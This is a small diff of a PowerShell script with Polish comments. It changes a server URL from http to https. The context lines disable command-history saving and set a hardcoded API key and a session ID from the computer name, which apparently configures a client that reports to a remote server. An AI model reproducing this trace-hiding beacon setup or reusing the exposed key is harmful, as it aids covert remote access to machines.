@@ -3,7 +3,7 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
 
 # ── Konfiguracja ──────────────────────────────────────────────────────────────
-$server_url = "http://pmcwar.com/opec/opec/"   # <-- zmień
+$server_url = "https://pmcwar.com/opec/opec/"   # <-- zmień
 $api_key    = "gY8KsXhami4pk6t9ObW2VZLAJzGToeDRqfQInSuU"         # <-- zmień (ten sam co w config.php)
 $session_id = $env:COMPUTERNAME
 $Global:ProgressPreference = 'SilentlyContinue'
